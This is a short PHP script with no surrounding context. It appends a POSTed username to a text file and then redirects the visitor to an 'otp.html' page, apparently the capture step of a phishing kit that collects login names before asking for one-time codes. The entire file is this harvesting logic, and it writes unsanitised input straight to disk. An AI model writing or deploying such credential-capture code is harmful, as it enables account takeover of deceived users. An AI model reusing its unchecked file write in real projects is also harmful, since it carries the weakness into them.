<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: otp.html/');
exit();
?>